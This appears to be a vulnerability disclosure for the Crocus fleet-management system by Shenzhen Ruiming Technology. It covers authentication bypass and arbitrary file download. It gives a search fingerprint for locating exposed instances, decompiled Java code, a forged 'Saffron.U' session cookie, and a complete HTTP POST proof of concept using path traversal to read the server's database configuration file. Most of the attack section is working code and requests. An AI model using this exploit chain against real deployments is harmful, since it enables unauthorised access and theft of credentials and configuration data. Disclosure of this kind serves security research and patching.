# Arbitrary File Download Vulnerability in the DeviceFileReport.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.


### Arbitrary File Download Vulnerability
We found a sink point. The relevant code is as follows:

```java
@RequestMapping(
        params = {"Action=Download"}
    )
    public void download(HttpServletRequest request, HttpServletResponse response) {
        try {
            String path = request.getParameter("FilePath");
            String filePath = request.getSession().getServletContext().getRealPath("/SystemFile" + path);
            File file = new File(filePath);
            int lastIndexOf = path.lastIndexOf("/");
            String name = path.substring(lastIndexOf + 1);
            String fileName = new String(name.getBytes("UTF-8"), "iso-8859-1");
            InputStream ins = new BufferedInputStream(new FileInputStream(file));
            byte[] buffer = new byte[ins.available()];
            ins.read(buffer);
            ins.close();
            response.reset();
            response.addHeader("Content-Disposition", "attachment;filename=" + fileName);
            response.addHeader("Content-Length", "" + file.length());
            OutputStream ous = new BufferedOutputStream(response.getOutputStream());
            response.setContentType("application/octet-stream;charset=UTF-8");
            ous.write(buffer);
            ous.flush();
            ous.close();
        } catch (Exception var12) {
            Exception e = var12;
            CommonFunction.writeExceptionLog("DeviceFileReport", e);
        }

    }
```
The `FilePath` parameter here is user-controllable, making this a typical arbitrary file download vulnerability.

Based on this, we can construct the following Proof of Concept (POC) to read the database configuration file:

```
POST http://ip:port/DeviceFileReport.do?Action=Download HTTP/1.1
Host: ip:port
Content-Length: 48
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: application/x-www-form-urlencoded

FilePath=../../WEB-INF/classes/config.properties
```

<img width="1920" height="846" alt="image" src="https://github.com/user-attachments/assets/8ae1aba5-f254-40eb-a7f2-5860a8f43035" />

Thank you for your review! Wish you all the best!
